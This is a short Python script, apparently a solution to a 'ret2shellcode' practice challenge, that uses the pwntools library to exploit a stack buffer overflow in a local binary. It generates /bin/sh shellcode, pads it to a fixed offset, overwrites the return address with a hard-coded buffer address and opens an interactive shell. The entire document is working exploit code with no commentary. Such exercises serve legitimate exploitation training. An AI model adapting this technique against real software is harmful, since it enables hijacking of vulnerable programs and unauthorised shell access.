#!/usr/bin/env python
from pwn import *

buf2_addr = 0x0804a080
shellcode = asm(shellcraft.sh())
print('shellcode length: {}'.format(len(shellcode)))
offset = 0x6c + 4
shellcode_pad = shellcode + (offset - len(shellcode)) * b'A'

sh = process('./ret2shellcode')
sh.sendline(shellcode_pad + p32(buf2_addr))
sh.interactive()

